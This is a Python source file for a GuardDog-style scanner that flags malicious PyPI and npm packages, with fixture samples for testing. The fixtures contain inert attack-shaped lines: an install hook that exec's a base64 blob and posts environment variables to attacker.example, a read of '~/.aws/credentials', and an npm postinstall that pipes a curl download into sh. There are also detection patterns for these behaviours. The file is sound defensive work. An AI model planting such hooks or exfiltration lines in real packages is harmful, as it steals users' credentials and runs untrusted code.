"""GuardDog-style heuristic scanner over fixture packages. Reads text only; nothing is executed.

The 'malicious' samples are inert strings that imitate the SHAPE of real attacks (domains are .example, secrets are FAKE).
"""

from __future__ import annotations

import math
import re
from collections import Counter
from dataclasses import dataclass

SAMPLES = {
    "requests-utils": {  # benign
        "meta": {"author_email": "dev@requests-utils.example", "email_domain_registered": True},
        "files": {"setup.py": "from setuptools import setup\nsetup(name='requests-utils', version='1.0')\n",
                  "requests_utils/__init__.py": "import json\n\ndef pretty(d):\n    return json.dumps(d, indent=2)\n"},
    },
    "reqeusts": {  # typosquat + exfil + install hook + obfuscation (inert)
        "meta": {"author_email": "bob@expired-domain.example", "email_domain_registered": False},
        "files": {
            "setup.py": ("import os, base64\nfrom setuptools import setup\nfrom setuptools.command.install import install\n"
                         "class Post(install):\n    def run(self):\n        exec(base64.b64decode('" + "QUJD" * 40 + "'))\n"
                         "        data = dict(os.environ)\n        import requests; requests.post('http://collect.attacker.example/x', json=data)\n"
                         "setup(name='reqeusts', cmdclass={'install': Post})\n"),
            "reqeusts/__init__.py": "open(os.path.expanduser('~/.aws/credentials')).read()\n",
        },
    },
    "left-padz-js": {  # npm: postinstall downloader
        "meta": {"author_email": "x@gmail.example", "email_domain_registered": True},
        "files": {"package.json": '{"name": "left-padz-js", "scripts": {"postinstall": "curl http://cdn.attacker.example/p.sh | sh"}}',
                  "index.js": "module.exports = (s, n) => s.padStart(n);\n"},
    },
}
KNOWN = ["requests", "numpy", "left-pad", "express", "lodash"]
ALLOWED_HOSTS = {"pypi.org", "files.pythonhosted.org", "registry.npmjs.org", "github.com"}


@dataclass(frozen=True)
class Finding:
    rule: str
    severity: str
    file: str
    detail: str


def entropy(s: str) -> float:
    c = Counter(s)
    return -sum(n / len(s) * math.log2(n / len(s)) for n in c.values())


def _lev(a: str, b: str) -> int:
    prev = list(range(len(b) + 1))
    for i, ca in enumerate(a, 1):
        cur = [i]
        for j, cb in enumerate(b, 1):
            cur.append(min(prev[j] + 1, cur[j - 1] + 1, prev[j - 1] + (ca != cb)))
        prev = cur
    return prev[-1]


def scan_package(name: str, pkg: dict):
    out = []
    base = re.sub(r"[-_]?(js|py)$", "", name)
    for k in KNOWN:
        if base != k and _lev(base, k) <= 2:
            out.append(Finding("typosquat", "high", "metadata", f"'{name}' is {_lev(base, k)} edit(s) from popular package '{k}'"))
    if not pkg["meta"].get("email_domain_registered", True):
        out.append(Finding("unregistered-maintainer-domain", "high", "metadata",
                           f"author email domain of {pkg['meta']['author_email']} is not registered (domain takeover risk)"))
    for path, text in pkg["files"].items():
        if path.endswith("setup.py") and re.search(r"cmdclass|class \w+\((install|develop)\)", text):
            out.append(Finding("install-hook", "medium", path, "setup.py overrides the install command"))
        if path.endswith("package.json") and re.search(r'"(pre|post)?install"\s*:', text):
            out.append(Finding("install-hook", "medium", path, "npm lifecycle install script present"))
        if re.search(r"curl[^\n]*\|\s*(sh|bash)", text):
            out.append(Finding("download-and-run", "high", path, "pipes a download into a shell"))
        if re.search(r"\b(exec|eval)\(", text) and re.search(r"b64decode|fromhex|atob", text):
            out.append(Finding("obfuscated-exec", "high", path, "decodes data then executes it"))
        for m in re.finditer(r"[A-Za-z0-9+/=]{80,}", text):
            if entropy(m.group()) > 1.0:
                out.append(Finding("long-encoded-blob", "medium", path, f"{len(m.group())}-char encoded string"))
                break
        if re.search(r"\.(aws|ssh)|credentials|\.npmrc|id_rsa", text):
            out.append(Finding("credential-path", "critical", path, "reads a well-known credential location"))
        if re.search(r"os\.environ|process\.env", text) and re.search(r"requests\.post|http\.request|fetch\(|urlopen", text):
            out.append(Finding("env-exfiltration", "critical", path, "reads environment variables and sends data over the network"))
        for host in re.findall(r"https?://([A-Za-z0-9.\-]+)", text):
            if host not in ALLOWED_HOSTS:
                out.append(Finding("unknown-endpoint", "medium", path, f"contacts {host}"))
    return out


def verdict(findings) -> str:
    sev = Counter(f.severity for f in findings)
    if sev["critical"] or sev["high"] >= 2:
        return "MALICIOUS-LIKELY"
    if findings:
        return "SUSPICIOUS"
    return "CLEAN"
